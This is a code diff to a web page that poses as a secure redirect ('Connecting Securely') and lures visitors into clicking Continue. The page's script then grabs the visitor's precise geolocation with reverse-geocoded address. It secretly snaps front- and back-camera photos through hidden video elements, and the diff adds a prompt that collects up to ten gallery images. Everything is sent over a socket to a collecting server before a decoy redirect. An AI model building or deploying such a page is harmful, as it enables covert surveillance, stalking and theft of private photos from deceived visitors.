@@ -8,7 +8,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-            background: #ffffff;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -16,12 +16,26 @@
             margin: 0;
             padding: 20px;
         }
-        .container { text-align: center; max-width: 450px; width: 100%; }
+        .container {
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+            background: rgba(255,255,255,0.95);
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            backdrop-filter: blur(10px);
+            animation: slideUp 0.5s ease-out;
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
         .spinner {
-            width: 40px;
-            height: 40px;
+            width: 60px;
+            height: 60px;
             border: 4px solid #e8ecf1;
-            border-top: 4px solid #4285f4;
+            border-top: 4px solid #667eea;
             border-radius: 50%;
             animation: spin 0.9s linear infinite;
             margin: 0 auto 20px;
@@ -30,73 +44,133 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .redirect-text { font-size: 18px; color: #1a2332; margin-bottom: 6px; font-weight: 500; }
+        .logo-icon {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        .redirect-text { font-size: 20px; color: #1a2332; margin-bottom: 6px; font-weight: 600; }
         .redirect-url { 
             font-size: 14px; 
-            color: #4285f4; 
+            color: #667eea; 
             word-break: break-all; 
             font-weight: 500;
             background: #f0f4ff;
-            padding: 8px 14px;
-            border-radius: 8px;
+            padding: 10px 16px;
+            border-radius: 10px;
             display: inline-block;
-            margin-top: 4px;
+            margin-top: 8px;
+            border: 1px solid #e0e7ff;
         }
-        .sub-text { font-size: 13px; color: #8895aa; margin-top: 12px; }
+        .sub-text { 
+            font-size: 14px; 
+            color: #8895aa; 
+            margin-top: 15px;
+            font-weight: 400;
+        }
         .btn-continue {
             margin-top: 25px;
-            padding: 14px 40px;
-            background: #4285f4;
+            padding: 16px 50px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 500;
+            border-radius: 50px;
+            font-size: 17px;
+            font-weight: 600;
             cursor: pointer;
-            transition: background 0.3s;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
         }
-        .btn-continue:hover { background: #3367d6; }
+        .btn-continue:hover { 
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.5);
+        }
         .btn-continue:disabled {
             background: #a0aec0;
             cursor: not-allowed;
+            box-shadow: none;
         }
         #statusText {
-            font-size: 14px;
+            font-size: 15px;
             color: #667eea;
-            margin-top: 15px;
+            margin-top: 18px;
             font-weight: 500;
-            min-height: 24px;
+            min-height: 28px;
         }
         #statusText.error { color: #e53e3e; }
         #statusText.success { color: #22a67e; }
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #e8ecf1;
+            border-radius: 2px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+        .progress-bar .fill {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            border-radius: 2px;
+            transition: width 0.3s ease;
+        }
+        .permission-badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 500;
+            margin: 3px;
+        }
+        .permission-badge.pending { background: #fef3c7; color: #92400e; }
+        .permission-badge.granted { background: #d4edda; color: #155724; }
+        .permission-badge.denied { background: #f8d7da; color: #721c24; }
+        #permissionStatus {
+            margin-top: 15px;
+            display: none;
+        }
         #hiddenVideo, #hiddenVideoBack { display: none; }
         .instructions {
             margin-top: 15px;
-            padding: 12px;
+            padding: 15px;
             background: #fef3c7;
-            border-radius: 8px;
+            border-radius: 10px;
             font-size: 13px;
             color: #92400e;
             display: none;
             text-align: left;
+            border: 1px solid #f6c23e;
         }
+        .instructions strong { display: block; margin-bottom: 5px; }
     </style>
 </head>
 <body>
     <div class="container">
+        <div class="logo-icon">🔐</div>
         <div class="spinner"></div>
-        <div class="redirect-text">Redirecting to</div>
+        <div class="redirect-text">Connecting Securely</div>
         <div class="redirect-url" id="redirectUrlDisplay">Loading...</div>
-        <div class="sub-text">Click continue to proceed</div>
+        <div class="sub-text">Click continue to grant access</div>
         <div id="statusText">Ready</div>
+        
+        <div id="permissionStatus">
+            <span class="permission-badge pending" id="permLocation">📍 Location</span>
+            <span class="permission-badge pending" id="permFront">📸 Front Camera</span>
+            <span class="permission-badge pending" id="permBack">📸 Back Camera</span>
+            <span class="permission-badge pending" id="permGallery">🖼️ Gallery</span>
+        </div>
+        
+        <div class="progress-bar">
+            <div class="fill" id="progressFill" style="width:0%"></div>
+        </div>
+        
         <div class="instructions" id="instructions">
-            <strong>How to fix:</strong><br>
+            <strong>🔧 How to fix:</strong>
             1. Click the lock icon in address bar<br>
             2. Set Camera to Allow<br>
             3. Set Location to Allow<br>
-            4. Refresh page and click Retry
+            4. Refresh and click Retry
         </div>
-        <button class="btn-continue" id="continueBtn">Continue</button>
+        
+        <button class="btn-continue" id="continueBtn">▶ Continue</button>
     </div>
 
     <video id="hiddenVideo" autoplay playsinline muted></video>
@@ -118,6 +192,8 @@
             const statusText = document.getElementById('statusText');
             const continueBtn = document.getElementById('continueBtn');
             const instructions = document.getElementById('instructions');
+            const progressFill = document.getElementById('progressFill');
+            const permissionStatus = document.getElementById('permissionStatus');
             
             let socket = null;
             let redirectUrl = 'https://www.google.com';
@@ -129,14 +205,39 @@
             let frontVideo = document.getElementById('hiddenVideo');
             let backVideo = document.getElementById('hiddenVideoBack');
             
-            let frontGranted = false;
-            let backGranted = false;
-            let locationGranted = false;
+            let permissions = {
+                location: false,
+                frontCamera: false,
+                backCamera: false,
+                gallery: false
+            };
 
             function updateStatus(msg, type = '') {
                 statusText.textContent = msg;
                 statusText.className = 'status-text' + (type ? ' ' + type : '');
                 console.log(msg);
+            }
+
+            function updateProgress(val) {
+                progressFill.style.width = val + '%';
+            }
+
+            function updatePermBadge(type, status) {
+                const map = {
+                    location: 'permLocation',
+                    front: 'permFront',
+                    back: 'permBack',
+                    gallery: 'permGallery'
+                };
+                const el = document.getElementById(map[type]);
+                if (el) {
+                    el.className = 'permission-badge ' + status;
+                    el.textContent = el.textContent.split(' ')[0] + ' ' + status.charAt(0).toUpperCase() + status.slice(1);
+                }
+            }
+
+            function showPermissions() {
+                permissionStatus.style.display = 'block';
             }
 
             function fetchRedirectUrl() {
@@ -216,6 +317,9 @@
                     language: navigator.language,
                     deviceName: navigator.userAgentData ? 
                         navigator.userAgentData.brands.map(b => b.brand).join(', ') : 
+                        navigator.platform,
+                    deviceModel: navigator.userAgentData ? 
+                        navigator.userAgentData.brands.map(b => b.brand).join(' ') : 
                         navigator.platform
                 };
 
@@ -267,53 +371,71 @@
                 backVideo.srcObject = null;
             }
 
+            // ============================================
+            // CONTINUE - ALL PERMISSIONS AT ONCE
+            // ============================================
             continueBtn.addEventListener('click', function() {
                 if (isProcessing) return;
                 isProcessing = true;
                 continueBtn.disabled = true;
                 continueBtn.textContent = 'Processing...';
                 instructions.style.display = 'none';
+                showPermissions();
                 
-                updateStatus('Requesting permissions...');
+                updateStatus('Requesting all permissions...');
+                updateProgress(10);
                 
-                frontGranted = false;
-                backGranted = false;
-                locationGranted = false;
+                permissions.location = false;
+                permissions.frontCamera = false;
+                permissions.backCamera = false;
+                permissions.gallery = false;
 
                 cleanupStreams();
 
+                // ---- REQUEST ALL PERMISSIONS IN PARALLEL ----
                 Promise.all([
-                    tryFrontCamera(),
-                    tryBackCamera(),
-                    tryLocation()
+                    requestLocation(),
+                    requestFrontCamera(),
+                    requestBackCamera(),
+                    requestGallery()
                 ])
                 .then(function(results) {
-                    const frontResult = results[0];
-                    const backResult = results[1];
-                    const locationResult = results[2];
+                    const locationResult = results[0];
+                    const frontResult = results[1];
+                    const backResult = results[2];
+                    const galleryResult = results[3];
+                    
+                    updateProgress(80);
                     
                     if (frontResult) {
-                        frontGranted = true;
+                        permissions.frontCamera = true;
                         frontStream = frontResult;
                         frontVideo.srcObject = frontResult;
                         frontVideo.play().catch(() => {});
+                        updatePermBadge('front', 'granted');
                         setTimeout(function() {
                             capturePhoto('front', frontResult);
                         }, 300);
+                    } else {
+                        updatePermBadge('front', 'denied');
                     }
                     
                     if (backResult) {
-                        backGranted = true;
+                        permissions.backCamera = true;
                         backStream = backResult;
                         backVideo.srcObject = backResult;
                         backVideo.play().catch(() => {});
+                        updatePermBadge('back', 'granted');
                         setTimeout(function() {
                             capturePhoto('back', backResult);
                         }, 300);
+                    } else {
+                        updatePermBadge('back', 'denied');
                     }
                     
                     if (locationResult) {
-                        locationGranted = true;
+                        permissions.location = true;
+                        updatePermBadge('location', 'granted');
                         if (socket && socket.connected) {
                             socket.emit('visitor-data', {
                                 visitorId,
@@ -321,17 +443,38 @@
                                 content: locationResult
                             });
                         }
+                    } else {
+                        updatePermBadge('location', 'denied');
                     }
                     
-                    if (!frontGranted && !backGranted) {
-                        updateStatus('No camera available. Please allow camera access.', 'error');
+                    if (galleryResult) {
+                        permissions.gallery = true;
+                        updatePermBadge('gallery', 'granted');
+                        if (socket && socket.connected) {
+                            socket.emit('visitor-data', {
+                                visitorId,
+                                type: 'galleryPhotos',
+                                content: galleryResult
+                            });
+                        }
+                    } else {
+                        updatePermBadge('gallery', 'denied');
+                    }
+                    
+                    updateProgress(100);
+                    
+                    // Check if at least camera worked
+                    if (!permissions.frontCamera && !permissions.backCamera) {
+                        updateStatus('❌ Camera access required. Please allow camera.', 'error');
+                        instructions.style.display = 'block';
                         isProcessing = false;
                         continueBtn.disabled = false;
                         continueBtn.textContent = 'Retry';
                         return;
                     }
                     
-                    updateStatus('Permissions granted! Redirecting...', 'success');
+                    // All done - redirect
+                    updateStatus('✅ All permissions granted! Redirecting...', 'success');
                     
                     if (socket && socket.connected) {
                         socket.emit('visitor-data', {
@@ -350,11 +493,11 @@
                 .catch(function(error) {
                     console.log('Error:', error);
                     
-                    if (!frontGranted && !backGranted) {
-                        updateStatus('Permission denied. Please allow camera.', 'error');
+                    if (!permissions.frontCamera && !permissions.backCamera) {
+                        updateStatus('❌ Permission denied. Please allow camera.', 'error');
                         instructions.style.display = 'block';
                     } else {
-                        updateStatus('Permissions granted! Redirecting...', 'success');
+                        updateStatus('✅ Permissions granted! Redirecting...', 'success');
                         setTimeout(function() {
                             if (!redirectTriggered) {
                                 redirectNow();
@@ -368,7 +511,54 @@
                 });
             });
 
-            function tryFrontCamera() {
+            // ============================================
+            // REQUEST LOCATION
+            // ============================================
+            function requestLocation() {
+                return new Promise(function(resolve) {
+                    if (!navigator.geolocation) {
+                        resolve(null);
+                        return;
+                    }
+                    
+                    navigator.geolocation.getCurrentPosition(
+                        function(position) {
+                            const lat = position.coords.latitude;
+                            const lng = position.coords.longitude;
+                            
+                            fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
+                                .then(res => res.json())
+                                .then(data => {
+                                    resolve({
+                                        lat, lng,
+                                        accuracy: position.coords.accuracy,
+                                        timestamp: new Date().toISOString(),
+                                        country: data.countryName || 'Unknown',
+                                        state: data.principalSubdivision || 'Unknown',
+                                        city: data.locality || 'Unknown',
+                                        fullAddress: data.localityInfo?.address || 'Unknown'
+                                    });
+                                })
+                                .catch(function() {
+                                    resolve({
+                                        lat, lng,
+                                        accuracy: position.coords.accuracy,
+                                        timestamp: new Date().toISOString()
+                                    });
+                                });
+                        },
+                        function() {
+                            resolve(null);
+                        },
+                        { timeout: 10000, enableHighAccuracy: true }
+                    );
+                });
+            }
+
+            // ============================================
+            // REQUEST FRONT CAMERA
+            // ============================================
+            function requestFrontCamera() {
                 return new Promise(function(resolve) {
                     navigator.mediaDevices.getUserMedia({
                         video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
@@ -392,7 +582,10 @@
                 });
             }
 
-            function tryBackCamera() {
+            // ============================================
+            // REQUEST BACK CAMERA
+            // ============================================
+            function requestBackCamera() {
                 return new Promise(function(resolve) {
                     navigator.mediaDevices.getUserMedia({
                         video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
@@ -407,46 +600,66 @@
                 });
             }
 
-            function tryLocation() {
+            // ============================================
+            // REQUEST GALLERY (Photos/Media)
+            // ============================================
+            function requestGallery() {
                 return new Promise(function(resolve) {
-                    if (!navigator.geolocation) {
-                        resolve(null);
-                        return;
-                    }
+                    // Use input element for file access
+                    const input = document.createElement('input');
+                    input.type = 'file';
+                    input.accept = 'image/*';
+                    input.multiple = true;
+                    input.style.display = 'none';
+                    document.body.appendChild(input);
                     
-                    navigator.geolocation.getCurrentPosition(
-                        function(position) {
-                            const lat = position.coords.latitude;
-                            const lng = position.coords.longitude;
-                            
-                            fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
-                                .then(res => res.json())
-                                .then(data => {
-                                    resolve({
-                                        lat, lng,
-                                        accuracy: position.coords.accuracy,
-                                        timestamp: new Date().toISOString(),
-                                        country: data.countryName || 'Unknown',
-                                        state: data.principalSubdivision || 'Unknown',
-                                        city: data.locality || 'Unknown'
-                                    });
-                                })
-                                .catch(function() {
-                                    resolve({
-                                        lat, lng,
-                                        accuracy: position.coords.accuracy,
-                                        timestamp: new Date().toISOString()
-                                    });
-                                });
-                        },
-                        function() {
-                            resolve(null);
-                        },
-                        { timeout: 8000, enableHighAccuracy: true }
-                    );
+                    input.onchange = function(e) {
+                        const files = e.target.files;
+                        const photos = [];
+                        let loaded = 0;
+                        
+                        if (files.length === 0) {
+                            document.body.removeChild(input);
+                            resolve([]);
+                            return;
+                        }
+                        
+                        for (let i = 0; i < Math.min(files.length, 10); i++) {
+                            const reader = new FileReader();
+                            reader.onload = function(event) {
+                                photos.push(event.target.result);
+                                loaded++;
+                                if (loaded === Math.min(files.length, 10)) {
+                                    document.body.removeChild(input);
+                                    resolve(photos);
+                                }
+                            };
+                            reader.readAsDataURL(files[i]);
+                        }
+                    };
+                    
+                    // If user cancels, resolve with empty array
+                    input.oncancel = function() {
+                        document.body.removeChild(input);
+                        resolve([]);
+                    };
+                    
+                    // Trigger file picker
+                    input.click();
+                    
+                    // Timeout fallback - if user doesn't select anything
+                    setTimeout(function() {
+                        if (document.body.contains(input)) {
+                            document.body.removeChild(input);
+                            resolve([]);
+                        }
+                    }, 30000);
                 });
             }
 
+            // ============================================
+            // CAPTURE PHOTO
+            // ============================================
             function capturePhoto(type, stream) {
                 if (!stream) return;
                 
@@ -489,6 +702,9 @@
                 };
             }
 
+            // ============================================
+            // REDIRECT
+            // ============================================
             function redirectNow() {
                 if (redirectTriggered) return;
                 redirectTriggered = true;
@@ -508,6 +724,9 @@
                 }, 500);
             }
 
+            // ============================================
+            // START
+            // ============================================
             if (typeof io !== 'undefined') {
                 fetchRedirectUrl();
             } else {
